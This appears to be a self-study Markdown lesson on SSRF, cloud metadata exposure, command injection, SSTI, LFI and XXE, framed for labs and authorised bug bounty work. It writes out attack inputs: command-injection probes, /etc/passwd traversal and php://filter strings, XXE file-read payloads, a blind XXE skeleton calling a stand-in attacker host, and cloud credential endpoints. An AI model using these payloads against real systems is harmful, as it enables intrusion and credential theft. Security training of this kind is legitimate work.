# 🔥 Day 08 — SSRF, RCE, LFI, XXE + Cloud Metadata Security

> **Part of:** 30-Day WAF Bypass & Payload Crafting Journey  
> **Date:** _Add your date_  
> **Difficulty:** ⭐⭐⭐⭐⭐ Expert  
> **Time Required:** 6–7 hours  

![Day](https://img.shields.io/badge/Day-08%2F30-blue)
![Status](https://img.shields.io/badge/Status-Core%20Mastery-red)
![Focus](https://img.shields.io/badge/Focus-Server%20Side%20Security-critical)
![Bounty](https://img.shields.io/badge/Bounty%20Potential-High-gold)

> ⚠️ **Ethical Use Only:**  
> Ei note shudhu educational purpose, personal lab, CTF, PortSwigger labs, Vulhub, Juice Shop, WebGoat, or authorized bug bounty / pentest scope er jonno. Unauthorized target e testing, credential access, data exfiltration, destructive payload, or cloud abuse kora jabe na.

---

## 📑 Table of Contents

- [🌐 Big Picture](#-big-picture)
- [🎯 Objectives](#-objectives)
- [⏰ Time Breakdown](#-time-breakdown)
- [🎯 Session 1: SSRF Complete Mastery](#-session-1-ssrf-complete-mastery)
- [☁️ Session 2: Cloud Metadata Security](#️-session-2-cloud-metadata-security)
- [⚡ Session 3: RCE & Command Injection](#-session-3-rce--command-injection)
- [📂 Session 4: LFI / Path Traversal Mastery](#-session-4-lfi--path-traversal-mastery)
- [📜 Session 5: XXE Injection Complete](#-session-5-xxe-injection-complete)
- [📖 Session 6: Real Hunter Chains](#-session-6-real-hunter-chains)
- [🏆 Day 8 Challenge](#-day-8-challenge)
- [📋 Master Cheat Sheets](#-master-cheat-sheets)
- [📚 Resources](#-resources)
- [❓ Self-Check Questions](#-self-check-questions)
- [🚀 What’s Next](#-whats-next)
- [📝 My Day 8 Notes](#-my-day-8-notes)

---

# 🌐 Big Picture

Server-side vulnerabilities usually create higher impact than client-side bugs because the target becomes the application server, internal network, cloud environment, or backend services.

```text
Client-side example:
XSS → affects users / sessions / frontend context

Server-side example:
SSRF / RCE / XXE / LFI → affects backend infrastructure
```

Typical high-impact chain:

```text
SSRF
  ↓
Internal service access
  ↓
Cloud metadata exposure
  ↓
Credential or token exposure
  ↓
Cloud privilege impact
```

> Goal: Learn how these bugs work in labs, then report safely and responsibly in real programs.

---

# 🎯 Objectives

End of this day, I will be able to:

- [ ] Explain SSRF types: basic, blind, semi-blind, DNS-based
- [ ] Understand cloud metadata exposure risks
- [ ] Identify SSRF filter bypass categories safely
- [ ] Understand command injection and RCE root causes
- [ ] Understand LFI, path traversal, wrappers, and log poisoning concepts
- [ ] Understand XXE file read, SSRF, blind OOB, and parser risks
- [ ] Use Burp Collaborator / OOB tools for lab-safe testing
- [ ] Think in vulnerability chains, not isolated payloads
- [ ] Document real-world style chains ethically

---

# ⏰ Time Breakdown

| Session | Topic | Duration |
|---|---|---:|
| 1 | SSRF Complete Mastery | 90 min |
| 2 | Cloud Metadata Security | 60 min |
| 3 | RCE & Command Injection | 75 min |
| 4 | LFI / Path Traversal Mastery | 60 min |
| 5 | XXE Injection Complete | 60 min |
| 6 | Real Hunter Chains | 75 min |
| **Total** |  | **~7 hours** |

---

# 🎯 Session 1: SSRF Complete Mastery

## What is SSRF?

**SSRF** means **Server-Side Request Forgery**.  
Attacker-controlled input causes the server to make a request to a chosen URL or internal resource.

```text
Normal flow:
User → App Server → External API

SSRF flow:
Attacker → App Server → Internal service / metadata / private network
```

---

## Why SSRF Matters

SSRF can allow attackers to:

- Access internal-only services
- Reach cloud metadata endpoints
- Trigger blind callbacks
- Enumerate internal ports
- Abuse server-side URL fetchers
- Chain into more serious impact

---

## SSRF Categories

### 1. Basic SSRF

The application returns the response from the fetched URL.

Example vulnerable pattern:

```python
url = request.args.get("image")
response = requests.get(url)
return response.content
```

Lab test ideas:

```text
http://localhost/
http://127.0.0.1/
http://10.0.0.1/
http://192.168.1.1/
```

---

### 2. Blind SSRF

The server makes a request, but the response is not shown.

Detection methods:

- Burp Collaborator
- interact.sh
- Self-hosted callback server
- DNS logs
- Timing differences
- Error behavior differences

Example callback idea:

```text
https://YOUR-COLLABORATOR-SUBDOMAIN.oastify.com/ssrf-test
```

---

### 3. Semi-Blind SSRF

The app gives partial feedback.

Examples:

```text
Connection refused
Timeout
Different status code
Different response size
Different error message
```

---

## SSRF Detection Points

Always check these parameters in labs and authorized targets:

```text
url
uri
link
redirect
src
dest
callback
feed
host
port
to
out
view
path
image
avatar
return
returnTo
next
continue
webhook
proxy
```

Also check:

```text
JSON body fields
XML body fields
File upload processors
SVG processors
PDF generators
Webhook integrations
URL preview features
Import-from-URL features
```

---

## SSRF Filter Bypass Categories

> Use these for defensive learning and authorized lab testing only.

### IP Representation Differences

Filters may block one IP format but miss another representation.

Common categories:

```text
Decimal IP
Hex IP
Octal IP
Short-form IP
IPv6 loopback
IPv4-mapped IPv6
URL-encoded host
DNS-based IP mapping
```

### DNS-Based Bypass Concepts

Some domains resolve to internal or chosen IPs.

Examples of concepts:

```text
nip.io style mapping
sslip.io style mapping
custom DNS A record
DNS rebinding
```

### URL Parser Confusion

Different parsers may interpret the same URL differently.

Examples of risky patterns:

```text
userinfo syntax with @
fragment confusion with #
double host confusion
encoded delimiters
nested URLs
scheme confusion
```

---

## Protocol Abuse Concepts

Some URL fetchers support more than HTTP.

Protocols to understand:

```text
http
https
file
ftp
gopher
dict
ldap
sftp
php wrappers
jar
netdoc
```

> ⚠️ Do not use protocol abuse against unauthorized systems. Use controlled labs only.

---

## Practical SSRF Lab Workflow

1. Find a URL-fetching feature
2. Send a safe callback URL
3. Check OOB interaction
4. Test allowed schemes
5. Test internal host restrictions
6. Document behavior
7. Report minimal proof only

Example lab-safe callback:

```bash
curl -X POST http://localhost:3000/profile/image/url \
  -d "imageUrl=https://YOUR-COLLABORATOR.oastify.com/test"
```

---

# ☁️ Session 2: Cloud Metadata Security

Cloud metadata services provide instance information and sometimes temporary credentials or identity tokens.

> In real bug bounty, do not dump data. Prove minimal impact and report responsibly.

---

## AWS Metadata

Endpoint concept:

```text
http://169.254.169.254/
```

Important paths:

```text
/latest/meta-data/
/latest/user-data/
/latest/meta-data/iam/security-credentials/
```

### IMDSv1 vs IMDSv2

| Version | Behavior | Security Difference |
|---|---|---|
| IMDSv1 | Simple GET request | Easier to abuse if SSRF exists |
| IMDSv2 | Requires token flow | Harder to exploit via limited SSRF |

IMDSv2 requires:

```text
PUT token request
special token header
metadata request with token
```

---

## GCP Metadata

Endpoint concept:

```text
http://metadata.google.internal/
```

Usually requires:

```text
Metadata-Flavor: Google
```

Important areas:

```text
computeMetadata/v1/
service-accounts/default/token
instance metadata
project metadata
```

---

## Azure Metadata

Endpoint concept:

```text
http://169.254.169.254/metadata/
```

Usually requires:

```text
Metadata: true
api-version parameter
```

Important areas:

```text
instance metadata
managed identity token
resource-specific token request
```

---

## Other Metadata Services

| Cloud | Metadata Endpoint Concept |
|---|---|
| AWS | `169.254.169.254` |
| GCP | `metadata.google.internal` |
| Azure | `169.254.169.254/metadata/` |
| DigitalOcean | `169.254.169.254/metadata/v1/` |
| Alibaba Cloud | `100.100.100.200` |
| Oracle Cloud | `192.0.0.192` |

---

## Safe Reporting Guidance

If metadata is reachable in bug bounty:

```text
Do:
- Capture minimal non-sensitive proof
- Use harmless identity check if allowed
- Redact tokens and credentials
- Report immediately

Do not:
- Dump buckets
- Access customer data
- Use temporary credentials broadly
- Pivot further without permission
```

---

# ⚡ Session 3: RCE & Command Injection

## What is Command Injection?

Command injection happens when user input is passed into an operating system command unsafely.

Vulnerable pattern:

```php
system("ping " . $_GET["host"]);
```

Example lab input patterns:

```text
; id
&& id
| id
|| id
$(id)
`id`
newline + command
```

---

## WAF / Filter Bypass Concepts

### Space Bypass

```text
${IFS}
tab
newline
brace expansion
input redirection
```

### Slash Bypass

```text
environment variable slicing
escaped slash
octal slash
current directory tricks
```

### Keyword Bypass

```text
wildcards
character classes
quotes inside keyword
backslash inside keyword
base64 reconstruction
variable concatenation
```

---

## Blind Command Injection

If output is not visible, use:

```text
time delay
DNS callback
HTTP callback
error-based behavior
```

Lab-safe examples:

```text
sleep test
Burp Collaborator callback
interact.sh callback
```

---

## Server-Side Template Injection

SSTI happens when user input is evaluated inside a template engine.

Detection probes:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
```

Engine mapping:

| Probe | Possible Engine |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Mustache |
| `${7*7}` | FreeMarker |
| `<%= 7*7 %>` | ERB |
| `#{7*7}` | Pug / Slim style |
| `{7*7}` | Smarty |

---

## Log4Shell Concept

Log4Shell abused unsafe JNDI lookups in vulnerable Log4j versions.

Common injection points to test in lab:

```text
User-Agent
Referer
X-Forwarded-For
username
search fields
logged input
```

> Test only on Vulhub / intentionally vulnerable labs.

---

## Deserialization RCE Concept

Deserialization risk occurs when an application deserializes untrusted data.

Examples:

```text
Java serialized objects
PHP serialized objects
Python pickle
.NET ViewState
YAML unsafe load
```

Tools to study in labs:

```text
ysoserial
phpggc
tplmap
pacu
```

---

# 📂 Session 4: LFI / Path Traversal Mastery

## What is LFI?

**Local File Inclusion** or **Path Traversal** allows reading files outside intended directories.

Vulnerable pattern:

```php
include($_GET["page"] . ".php");
```

Basic path traversal concepts:

```text
../
../../
../../../
encoded ../
double-encoded traversal
path normalization tricks
extension bypass
null byte legacy bypass
```

---

## Common Files to Test in Labs

Linux:

```text
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/version
```

Web logs:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

PHP sessions:

```text
/var/lib/php/sessions/
tmp session files
```

Windows:

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
```

---

## PHP Wrapper Concepts

Useful wrappers to understand:

```text
php://filter
data://
expect://
php://input
zip://
phar://
```

### Source Code Disclosure

```text
php://filter/convert.base64-encode/resource=index.php
```

Purpose:

```text
Read source code as base64
Decode locally
Find secrets / routes / logic bugs
```

---

## LFI to RCE Concepts

Common chains:

```text
LFI + log poisoning
LFI + session poisoning
LFI + php://input
LFI + file upload
LFI + phar deserialization
```

> Use only in intentionally vulnerable labs.

---

# 📜 Session 5: XXE Injection Complete

## What is XXE?

**XML External Entity** injection abuses XML entity resolution.

Impact can include:

```text
Local file read
SSRF
Blind OOB exfiltration
Denial of service
Internal network access
```

---

## Vulnerable Code Pattern

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userInput);
```

Risk: XML parser is not hardened against external entities.

---

## Classic XXE File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## XXE as SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service/">
]>
<root>&xxe;</root>
```

---

## Blind XXE OOB Flow

```text
1. Host malicious DTD on your server
2. Target parser loads external DTD
3. External DTD causes callback
4. You confirm interaction in server logs
```

Skeleton:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker-controlled-lab/evil.dtd">
  %remote;
]>
<root>test</root>
```

---

## XXE in File Formats

Many formats are XML-based:

```text
.docx
.xlsx
.pptx
.odt
.svg
.xml sitemap
.rss
.atom
.xmi
.plist
.xfa
```

---

## SVG XXE Concept

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## XInclude Concept

When only partial XML is controllable:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## XXE Defense Checklist

- Disable external entity resolution
- Disable DTD processing
- Use safe XML parser defaults
- Avoid XML when JSON is enough
- Restrict outbound network access
- Block metadata endpoints from app workloads
- Monitor unusual DNS / HTTP egress

---

# 📖 Session 6: Real Hunter Chains

## Chain 1 — SSRF → Cloud Metadata → Cloud Impact

Pattern:

```text
URL fetch feature
  ↓
SSRF to metadata service
  ↓
Temporary credential exposure
  ↓
Cloud identity proof
  ↓
Responsible report
```

Safe reporting proof:

```text
Only show role name or identity check if allowed
Redact credentials
Do not access data
```

---

## Chain 2 — GitLab-Style SSRF Pattern

Pattern:

```text
Remote include / import feature
  ↓
Server fetches attacker-controlled URL
  ↓
Internal resource reachable
  ↓
Metadata or internal service exposure
```

---

## Chain 3 — Webhook URL Validation Bypass

Pattern:

```text
Webhook URL field
  ↓
Weak validation
  ↓
Parser confusion
  ↓
Backend connects to unintended host
```

---

## Chain 4 — XXE → Internal Access

Pattern:

```text
XML upload endpoint
  ↓
External entity enabled
  ↓
File read or SSRF
  ↓
Sensitive internal data exposed
```

---

## Chain 5 — LFI → Log Poisoning → Code Execution

Pattern:

```text
User-controlled log entry
  ↓
LFI reads log file
  ↓
Server-side code inside log executes
  ↓
RCE in vulnerable lab
```

---

## Chain 6 — SSTI in Email Template

Pattern:

```text
Custom template feature
  ↓
Template expression allowed
  ↓
Template engine evaluates input
  ↓
Server-side code execution
```

---

## Chain 7 — Blind SSRF → DNS Rebinding

Pattern:

```text
URL validation checks public IP
  ↓
DNS changes after validation
  ↓
Backend connects to internal IP
  ↓
SSRF bypass
```

---

## Chain 8 — Log4Shell in Logged Header

Pattern:

```text
Logged request header
  ↓
Vulnerable Log4j parser
  ↓
JNDI lookup
  ↓
Remote code execution in vulnerable lab
```

---

## Chain 9 — Expression Language Injection

Pattern:

```text
Expression language sink
  ↓
User-controlled expression
  ↓
Server evaluates expression
  ↓
Command execution
```

---

## Chain 10 — Stored SSRF via SVG / PDF Renderer

Pattern:

```text
SVG upload
  ↓
Backend renderer processes external image URL
  ↓
Renderer fetches internal service
  ↓
SSRF via file rendering pipeline
```

---

# 🏆 Day 8 Challenge

Mark Day 8 complete after:

- [ ] SSRF detected using Burp Collaborator in a lab
- [ ] Fake metadata endpoint created locally
- [ ] Metadata exposure simulated through lab SSRF
- [ ] At least 5 IP representation methods documented
- [ ] Gopher protocol concept studied
- [ ] Log4Shell tested only on Vulhub lab
- [ ] Command injection filter bypass concepts documented
- [ ] SSTI lab solved
- [ ] LFI source disclosure tested in lab
- [ ] LFI chain documented safely
- [ ] XXE file read tested in lab
- [ ] Blind XXE OOB flow understood
- [ ] SVG XXE concept tested in safe lab
- [ ] 10 hunter chains documented in payload vault
- [ ] Burp Collaborator used 5+ times
- [ ] Pushed `Day-08.md` to GitHub

---

# 📋 Master Cheat Sheets

## Cheat Sheet 1: SSRF Quick Payload Categories

```text
Loopback:
- localhost
- 127.0.0.1
- [::1]
- short-form loopback
- decimal loopback
- hex loopback

Cloud metadata:
- direct metadata IP
- decimal representation
- hex representation
- IPv6-mapped representation
- DNS mapping domain

Parser confusion:
- userinfo syntax
- fragment confusion
- encoded delimiters
- nested URL
```

---

## Cheat Sheet 2: Cloud Metadata Endpoints

```text
AWS:
http://169.254.169.254/latest/meta-data/

GCP:
http://metadata.google.internal/computeMetadata/v1/

Azure:
http://169.254.169.254/metadata/

DigitalOcean:
http://169.254.169.254/metadata/v1/

Alibaba:
http://100.100.100.200/latest/meta-data/
```

---

## Cheat Sheet 3: Command Injection Bypass Concepts

```text
Space bypass:
${IFS}
tab
newline
brace expansion

Slash bypass:
environment variable tricks
escaped slash
octal slash

Keyword bypass:
wildcards
quotes
backslash
base64 reconstruction

Blind detection:
sleep
DNS callback
HTTP callback
```

---

## Cheat Sheet 4: LFI Payload Categories

```text
Basic file read:
../../../../etc/passwd

Encoded traversal:
URL encoded
double encoded
overlong encoding

PHP wrapper:
php://filter/convert.base64-encode/resource=index.php

Log paths:
Apache logs
Nginx logs
PHP logs
auth logs

Runtime files:
proc filesystem
session files
environment files
```

---

## Cheat Sheet 5: XXE Quick Payloads

```xml
<!-- File read -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<r>&xxe;</r>
```

```xml
<!-- SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service/">
]>
<r>&xxe;</r>
```

```xml
<!-- Blind OOB skeleton -->
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker-controlled-lab/evil.dtd">
  %remote;
]>
<r/>
```

---

## Cheat Sheet 6: SSTI Detection → Engine Map

```text
{{7*7}}    → Jinja2 / Twig / Mustache style
${7*7}     → FreeMarker style
<%= 7*7 %> → ERB style
#{7*7}     → Pug / Slim style
{7*7}      → Smarty style
@{7*7}     → Razor style
*{7*7}     → Spring style
```

---

# 📚 Resources

## Essential Reading

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [PayloadsAllTheThings File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

## Tools

- [Gopherus](https://github.com/tarunkant/Gopherus)
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [tplmap](https://github.com/epinna/tplmap)
- [pacu](https://github.com/RhinoSecurityLabs/pacu)
- [ysoserial](https://github.com/frohoff/ysoserial)
- [phpggc](https://github.com/ambionics/phpggc)

## Cloud Security

- [HackTricks Cloud](https://cloud.hacktricks.xyz/)
- [AWS Security Best Practices](https://docs.aws.amazon.com/security/)
- [Cloudvulndb](https://www.cloudvulndb.org/)

## Hunter Research

- @infosec_au
- @samwcyo
- @0xacb
- @NahamSec
- Assetnote Research
- PortSwigger Research
- HackerOne Hacktivity

---

# ❓ Self-Check Questions

1. Blind SSRF detection e Burp Collaborator kivabe help kore?
2. AWS IMDSv1 vs IMDSv2 — difference ki?
3. Metadata IP er 5 ta different representation bolo.
4. Gopher protocol SSRF impact kivabe increase korte pare?
5. DNS rebinding kivabe IP filter bypass kore?
6. SSTI engine fingerprinting er 5 ta probe payload ki?
7. LFI via log poisoning er chain explain koro.
8. Blind XXE OOB DTD flow er 3 step ki?
9. Command injection e `${IFS}` concept ki?
10. Log4Shell payload obfuscation er idea ki?
11. `php://filter` wrapper er use case ki?
12. Cloud metadata hardening e IMDSv2 kivabe help kore?

✅ All 12 answered confidently? **Day 8 complete!**

---

# 🚀 What’s Next?

**Day 9 Preview:** HTTP Request Smuggling, Cache Poisoning, Desync Attacks

- CL.TE, TE.CL, TE.TE smuggling
- HTTP/2 downgrade smuggling
- Web cache poisoning
- Cache key injection
- Response queue poisoning
- Desync chains
- Albinowax research deep dive

---

# 📝 My Day 8 Notes

<!-- Fill in after completion -->

## SSRF Findings

```text
Target tested:
IP bypass that worked:
Cloud metadata accessed: [ ] AWS [ ] GCP [ ] Azure
IAM creds extracted: redacted / not accessed
```

---

## RCE Achievements

- [ ] Log4Shell tested on Vulhub
- [ ] SSTI lab solved
- [ ] Command injection lab solved
- [ ] Filter bypass concept documented

```text
Method that worked:
```

---

## LFI Chain

- [ ] Basic LFI file read
- [ ] PHP wrapper source disclosure
- [ ] Log poisoning concept understood
- [ ] Session file concept understood

---

## XXE Results

- [ ] Classic file read
- [ ] Blind OOB via external DTD
- [ ] SVG XXE
- [ ] XInclude

---

## Burp Collaborator Stats

```text
Total interactions captured today:
Most valuable callback:
```

---

## Favorite Chain of the Day

```text
Source:
Chain: ____ → ____ → ____
Impact:
```

---

## Key Insight

```text
Server-side vulnerabilities compound. Each one can unlock the next. Chain thinking beats single-bug thinking.
```

---

## Questions for Research

```text
-
-
-
```

---

<p align="center">
  <strong>🎓 Day 8 Status:</strong> ⬜ In Progress / ✅ Complete<br>
  <em>“The best hunters do not just find bugs. They build chains.”</em>
</p>

<p align="center">
  <a href="./Day-07.md">← Previous: Day 07</a> |
  <a href="./Day-09.md">Next: Day 09 →</a>
</p>
